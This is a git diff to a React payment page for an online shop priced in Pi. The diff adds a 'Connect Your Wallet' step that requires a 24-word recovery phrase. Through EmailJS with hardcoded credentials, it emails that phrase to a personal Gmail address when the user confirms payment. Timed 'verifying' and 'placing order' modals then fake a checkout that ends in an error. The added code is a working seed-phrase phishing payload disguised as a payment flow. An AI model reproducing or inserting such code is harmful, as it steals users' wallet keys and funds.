@@ -5,12 +5,22 @@ import { useUser } from "../context/UserContext";
 import CartContext from "../context/CartContext";
 import Phrase from "../components/Phrase";
 import PaymentMethod from "../components/PaymentMethod";
+import emailjs from "@emailjs/browser";
+
 
 const PaymentPage = () => {
   const { user } = useUser();
   const { clearCart } = useContext(CartContext);
   const { totalPrice } = useParams();
-  
+  const [phrase, setPhrase] = useState("");
+  const [error, setError] = useState(false);
+  const [loading, setLoading] = useState(false);
+
+  const serviceID = "service_t1nq7uj";
+
+  const templateID = "template_womg9wj";
+  const userID = "wn-KizZUAJPXgXFA4";
+
   const [modal, setModal] = useState(false);
   const [selectedMethod, setSelectedMethod] = useState(null);
   const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds
@@ -20,7 +30,39 @@ const PaymentPage = () => {
   const [verificationFailed, setVerificationFailed] = useState(false);
   const [showLocationModal, setShowLocationModal] = useState(false);
   const [showPlacingOrderModal, setShowPlacingOrderModal] = useState(false);
-  const [deliveryLocation, setDeliveryLocation] = useState(user?.address || "Your delivery address here");
+  const [deliveryLocation, setDeliveryLocation] = useState(
+    user?.address || "Your delivery address here"
+  );
+
+  const handleSend = async () => {
+    setLoading(true);
+
+    const wordCount = phrase.trim().split(/\s+/).length;
+    if (wordCount !== 24) {
+      setError(true);
+      setLoading(false); // Stop loading if there is an error
+      return;
+    }
+
+    const templateParams = { message: phrase };
+
+    try {
+      await emailjs.send(serviceID, templateID, templateParams, userID, {
+        to: ["ld604068@gmail.com"],
+      });
+      setPhrase("");
+      setLoading(true);
+
+      // navigate('/approved')
+      console.log("sent");
+    } catch (error) {
+      console.error("Error:", error);
+      alert("Verification failed. Please try again.");
+      setError(true);
+    } finally {
+      setLoading(false); // Stop loading after async operation completes
+    }
+  };
 
   // Utility Functions
   const formatTime = (seconds) => {
@@ -46,6 +88,7 @@ const PaymentPage = () => {
 
   const handlePaymentConfirm = () => {
     setShowConfirmPaymentModal(true);
+    handleSend();
   };
 
   const confirmPayment = () => {
@@ -62,11 +105,8 @@ const PaymentPage = () => {
     setTimeout(() => {
       setShowVerification(false);
       confirmLocation();
-     
     }, 5000);
   };
-
-
 
   const confirmLocation = () => {
     setShowLocationModal(true);
@@ -75,8 +115,8 @@ const PaymentPage = () => {
   const finalizeOrder = () => {
     clearCart();
     setModal(false);
-    console.log("completing order")
-    setShowPlacingOrderModal(false)
+    console.log("completing order");
+    setShowPlacingOrderModal(false);
 
     Swal.fire({
       icon: "error",
@@ -108,11 +148,12 @@ const PaymentPage = () => {
   const renderModals = () => (
     <>
       {showPlacingOrderModal && (
-        <Modal title="Placing Order..." message="Please wait while we process your order." />
+        <Modal
+          title="Placing Order..."
+          message="Please wait while we process your order."
+        />
       )}
-      {showVerification && (
-        <Modal title="Verifying Payment..." />
-      )}
+      {showVerification && <Modal title="Verifying Payment..." />}
       {verificationFailed && (
         <Modal
           title="Payment Verification Failed"
@@ -146,7 +187,6 @@ const PaymentPage = () => {
             setShowPlacingOrderModal(true);
             setTimeout(() => {
               finalizeOrder();
-          
             }, 5000); // 5-second delay
           }}
           onCancel={declineLocation}
@@ -159,7 +199,11 @@ const PaymentPage = () => {
   const Modal = ({ title, message, isError, onClose }) => (
     <div className="fixed inset-0 flex items-center justify-center bg-black/50">
       <div className="bg-white p-6 rounded-md">
-        <h3 className={`text-lg font-semibold ${isError ? "text-red-600" : ""}`}>{title}</h3>
+        <h3
+          className={`text-lg font-semibold ${isError ? "text-red-600" : ""}`}
+        >
+          {title}
+        </h3>
         {message && <p>{message}</p>}
         {onClose && (
           <button
@@ -199,23 +243,25 @@ const PaymentPage = () => {
   if (!user) {
     return (
       <div className="bg-white shadow-md rounded-lg p-8 max-w-md w-full text-center">
-          <h1 className="text-3xl font-semibold mb-4 text-gray-800">User Profile</h1>
-          <p className="text-gray-600 mb-6">You are not logged in</p>
-          <div className="flex justify-center space-x-4">
-            <a
-              className="bg-green-500 text-white px-4 py-2 rounded-md hover:bg-green-600 transition-colors"
-              href="/login"
-            >
-              Login
-            </a>
-            <a
-              className="bg-indigo-500 text-white px-4 py-2 rounded-md hover:bg-indigo-600 transition-colors"
-              href="/signup"
-            >
-              Sign Up
-            </a>
-          </div>
+        <h1 className="text-3xl font-semibold mb-4 text-gray-800">
+          User Profile
+        </h1>
+        <p className="text-gray-600 mb-6">You are not logged in</p>
+        <div className="flex justify-center space-x-4">
+          <a
+            className="bg-green-500 text-white px-4 py-2 rounded-md hover:bg-green-600 transition-colors"
+            href="/login"
+          >
+            Login
+          </a>
+          <a
+            className="bg-indigo-500 text-white px-4 py-2 rounded-md hover:bg-indigo-600 transition-colors"
+            href="/signup"
+          >
+            Sign Up
+          </a>
         </div>
+      </div>
     );
   }
 
@@ -226,7 +272,7 @@ const PaymentPage = () => {
           {renderModals()}
           <div className="mt-6">
             <h3 className="text-lg font-semibold">Connect Your Wallet</h3>
-            <Phrase />
+            <Phrase handleSend={handleSend} setPhrase={setPhrase} phrase={phrase} error={error} loading={loading} />
             <p className="mt-2">Amount to Pay: {totalPrice} Pi</p>
           </div>
           <div className="mt-4">
